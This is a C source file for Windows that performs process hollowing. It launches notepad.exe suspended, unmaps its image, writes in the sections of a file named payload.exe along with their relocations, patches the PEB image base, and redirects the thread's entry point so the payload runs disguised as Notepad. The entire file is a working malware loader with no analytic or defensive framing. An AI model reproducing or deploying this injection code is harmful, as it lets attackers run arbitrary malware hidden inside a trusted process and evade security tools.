#include <windows.h>
#include <stdio.h>
#include <intrin.h>
#include <processthreadsapi.h>
#include <winternl.h>
typedef FARPROC (WINAPI *fn_GetProcAddress)(HMODULE, LPCSTR);
typedef LPVOID  (WINAPI *fn_VirtualAllocEX)(LPVOID, SIZE_T, DWORD, DWORD);
typedef LPVOID  (WINAPI *fn_memcpy)(LPVOID, const void*, SIZE_T);

typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress
);
typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(
    HANDLE           ProcessHandle,            
    PROCESSINFOCLASS ProcessInformationClass,  
    PVOID            ProcessInformation,      
    ULONG            ProcessInformationLength, 
    PULONG           ReturnLength        
);

LPVOID getpe(DWORD *payload_size){
    HANDLE hFile = CreateFileW(L"C:\\Users\\payload.exe", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("CreateFileW failed: %lu\n", GetLastError());
        return NULL;
    }
    *payload_size = GetFileSize(hFile, NULL);
    BYTE* buffer = (BYTE*)malloc(*payload_size);
    DWORD bytesRead =0;
    ReadFile(hFile, buffer, *payload_size, &bytesRead, NULL);
    CloseHandle(hFile);
    return buffer;
}


int main() {
    STARTUPINFOA si = { sizeof(si)  } ;
    PROCESS_INFORMATION pi ={0};
    BOOL notepad_handle = CreateProcessA(NULL, "notepad.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    if (!notepad_handle) {
        printf("Failed to create process. Error code: %lu\n", GetLastError());
        return 1;
    }
    DWORD payload_size =0;
    LPVOID payload_buffer = getpe(&payload_size);
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)payload_buffer;
    if (dos_header->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("Invalid DOS signature.\n");
        return 1;
    }
    PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)((BYTE*)payload_buffer + dos_header->e_lfanew);
    if (nt_header->Signature != IMAGE_NT_SIGNATURE) {
        printf("Invalid NT signature.\n");
        return 1;
    }
    DWORD payload_size_of_image = nt_header->OptionalHeader.SizeOfImage;
    ULONGLONG  payload_image_base = nt_header->OptionalHeader.ImageBase;
    
    PROCESS_BASIC_INFORMATION pbi ={0};
    PVOID target_image_base = 0;
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtUnmapViewOfSection NtUnmapViewOfSection_ldr = (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    pNtQueryInformationProcess NtQueryInformationProcess_ldr = (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    NtQueryInformationProcess_ldr(pi.hProcess,0,&pbi,sizeof(pbi),NULL);
    ReadProcessMemory(pi.hProcess,(PBYTE)pbi.PebBaseAddress + 0x10, &target_image_base,sizeof(target_image_base), NULL);
    NTSTATUS status = NtUnmapViewOfSection_ldr(pi.hProcess, target_image_base);
    LPVOID allocated_base = VirtualAllocEx(pi.hProcess, (PVOID)payload_image_base, payload_size_of_image, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!allocated_base ) {
        allocated_base = VirtualAllocEx(pi.hProcess, target_image_base, payload_size_of_image, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);


    }
    if (!allocated_base) {
    return 1;
    }
    ULONGLONG delta = (ULONGLONG)allocated_base - payload_image_base;
    if (delta != 0) {
        IMAGE_DATA_DIRECTORY relocDir  = nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        DWORD reloc_rva = relocDir.VirtualAddress;
        DWORD reloc_size = relocDir.Size;
        LPVOID reloc_base = (BYTE*)payload_buffer + reloc_rva;
        BYTE* reloc_end = (BYTE*)reloc_base + reloc_size;
        while (reloc_base < reloc_end) {
            IMAGE_BASE_RELOCATION* block = (IMAGE_BASE_RELOCATION*)reloc_base;
            if (block->SizeOfBlock == 0){
                break;
            }
            WORD* entries = (WORD*)((BYTE*)reloc_base + sizeof(IMAGE_BASE_RELOCATION));
            DWORD entry_count = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);    
            for (DWORD i = 0; i < entry_count; i++) {
                WORD type   = entries[i] >> 12;        // 상위 4비트
                WORD offset = entries[i] & 0xFFF;      // 하위 12비트

                if (type == IMAGE_REL_BASED_DIR64) {   // 10 (0xA) — 64비트
                    ULONGLONG* patchAddr = (ULONGLONG*)((BYTE*)payload_buffer + block->VirtualAddress + offset);
                    *patchAddr += delta;
                }
                else if (type == IMAGE_REL_BASED_HIGHLOW) {  // 3 — 32비트
                    DWORD* patchAddr = (DWORD*)((BYTE*)payload_buffer + block->VirtualAddress + offset);
                    *patchAddr += (DWORD)delta;
                }
        }
            reloc_base = (IMAGE_BASE_RELOCATION*)((BYTE*)reloc_base + block->SizeOfBlock);

    }
}
    WriteProcessMemory(pi.hProcess, allocated_base, payload_buffer, nt_header->OptionalHeader.SizeOfHeaders, NULL);

    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt_header);
    for (int i = 0; i < nt_header->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(pi.hProcess, (BYTE*)allocated_base + section[i].VirtualAddress, (BYTE*)payload_buffer + section[i].PointerToRawData, section[i].SizeOfRawData, NULL);
    }
    WriteProcessMemory(pi.hProcess, (BYTE*)pbi.PebBaseAddress + 0x10, &allocated_base, sizeof(PVOID), NULL);

    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    ctx.Rcx = (DWORD64)((BYTE*)allocated_base + nt_header->OptionalHeader.AddressOfEntryPoint);
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}
